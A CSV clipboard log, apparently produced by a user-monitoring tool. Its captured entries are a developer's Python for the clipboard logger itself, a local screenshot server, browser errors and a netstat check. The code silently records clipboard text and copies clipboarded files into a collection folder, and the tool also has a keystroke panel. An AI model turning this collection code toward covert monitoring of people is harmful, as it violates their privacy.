Timestamp,Username,IP,Data
2024-07-02 12:16:09,Toshiba,192.168.100.200,Test clipboard text
2024-07-02 12:16:19,Toshiba,192.168.100.200,"def log_clipboard(data):
    try:
        last_clipboard_value = getattr(log_clipboard, ""last_value"", None)

        if data != last_clipboard_value:
            timestamp = datetime.now().strftime(""%Y-%m-%d %H:%M:%S"")
            username = get_username()
            ip = get_ip()

            # Set up user directories
            user_dir, clipboard_dir, screenshot_dir, files_dir, video_dir = (
                setup_user_directories(username)
            )

            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()

            if isinstance(data, list):  # Check if data is a list of file paths
                for file_path in data:
                    if os.path.isfile(file_path):
                        try:
                            dest_path = os.path.join(files_dir, os.path.basename(file_path))
                            shutil.copy(file_path, dest_path)  # Copy the file to server
                            log_entry = f""Clipboard: copy path: {file_path}, paste path: {dest_path}""

                            c.execute(
                                ""INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)"",
                                (timestamp, username, ip, log_entry),
                            )
                            print(f""Clipboard logged: {log_entry}"")
                        except Exception as e:
                            print(f""Error logging clipboard file: {e}"")
                    else:
                        print(f""File not found: {file_path}"")

            else:
                log_entry = f""Clipboard: {data}""

                # Save clipboard text to CSV
                csv_file_path = os.path.join(clipboard_dir, ""clipboard_logs.csv"")
                file_exists = os.path.isfile(csv_file_path)

                try:
                    with open(csv_file_path, mode=""a"", newline="""") as csv_file:
                        csv_writer = csv.writer(csv_file)
                        if not file_exists:
                            csv_writer.writerow(
                                [""Timestamp"", ""Username"", ""IP"", ""Data""]
                            )  # Write headers
                        csv_writer.writerow([timestamp, username, ip, data])

                    c.execute(
                        ""INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)"",
                        (timestamp, username, ip, log_entry),
                    )
                    print(f""Clipboard logged: {log_entry}"")
                except Exception as e:
                    print(f""Error logging clipboard text: {e}"")

            conn.commit()
            conn.close()

            log_clipboard.last_value = data

    except Exception as e:
        print(f""Error logging clipboard data: {e}"")

# Test the function
log_clipboard(""Test clipboard text"")"
2024-07-02 12:16:26,Toshiba,192.168.100.200,the function does not seems to be working as i copied the file and nothing is logged nor the error in the console as it's logging the clipboard text conten
2024-07-02 12:23:59,Toshiba,192.168.100.200,Test clipboard text
2024-07-04 19:55:44,Toshiba,192.168.100.200,"jquery-3.6.0.min.js:2 
 
 GET http://localhost:8080/screenshots.html 404 (NOT FOUND)
(index):19652 
 Error loading screenshots: NOT FOUND
error	@	(index):19652
c	@	jquery-3.6.0.min.js:2
fireWith	@	jquery-3.6.0.min.js:2
l	@	jquery-3.6.0.min.js:2
(anonymous)	@	jquery-3.6.0.min.js:2
load (async)		
send	@	jquery-3.6.0.min.js:2
ajax	@	jquery-3.6.0.min.js:2
(anonymous)	@	(index):19643
dispatch	@	jquery-3.6.0.min.js:2
v.handle	@	jquery-3.6.0.min.js:2"
2024-07-04 19:57:32,Toshiba,192.168.100.200," <main class=""col-md-10"">"
2024-07-04 19:58:31,Toshiba,192.168.100.200,"          <div id=""keystrokesContent"">
"
2024-07-04 20:05:32,Toshiba,192.168.100.200,"def start_http_server():
    # Specify the directory containing your screenshots
    screenshot_dir = os.path.abspath(""LoggedData/Toshiba/Screenshot"")

    # Command to start http.server on port 8000
    command = [""python"", ""-m"", ""http.server"", ""8000"", ""--directory"", screenshot_dir]
    print(command)

    # Start subprocess
    try:
        subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f""HTTP server started at {command}"")
    except Exception as e:
        print(f""Error starting HTTP server: {e}"")"
2024-07-04 20:07:35,Toshiba,192.168.100.200,"def start_http_server():
    # Specify the directory containing your screenshots
    screenshot_dir = os.path.abspath(""LoggedData/Toshiba/Screenshot"")

    # Command to start http.server on port 8000
    command = [""python"", ""-m"", ""http.server"", ""8000"", ""--directory"", screenshot_dir]
    print(f""Starting HTTP server with command: {' '.join(command)}"")

    try:
        # Start subprocess
        subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f""HTTP server started. Serving files from {screenshot_dir} on port 8000."")
    except Exception as e:
        print(f""Error starting HTTP server: {e}"")"
2024-07-04 20:10:48,Toshiba,192.168.100.200,"This page isn’t working right nowlocalhost didn’t send any data.
ERR_EMPTY_RESPONSE"
2024-07-04 20:11:38,Toshiba,192.168.100.200,http://localhost:8080/
2024-07-04 20:11:53,Toshiba,192.168.100.200,"GET http://localhost:8000/screenshot_20240703_095329.png net::ERR_EMPTY_RESPONSE
screenshots:70 
        
        
        GET http://localhost:8000/screenshot_20240703_095328.png net::ERR_EMPTY_RESPONSE
screenshots:58 
        
        
        GET http://localhost:8000/screenshot_20240703_095321.png net::ERR_EMPTY_RESPONSE
screenshots:46 
        
        
        GET http://localhost:8000/screenshot_20240703_095318.png net::ERR_EMPTY_RESPONSE
screenshots:34 
        
        
        GET http://localhost:8000/screenshot_20240703_095316.png net::ERR_EMPTY_RESPONSE
screenshots:94 
        
        
        GET http://localhost:8000/screenshot_20240703_095331.png net::ERR_EMPTY_RESPONSE
screenshots:178 
        
        
        GET http://localhost:8000/screenshot_20240703_095604.png net::ERR_EMPTY_RESPONSE"
2024-07-04 20:12:30,Toshiba,192.168.100.200,"sudo netstat -tuln | grep 8000
"
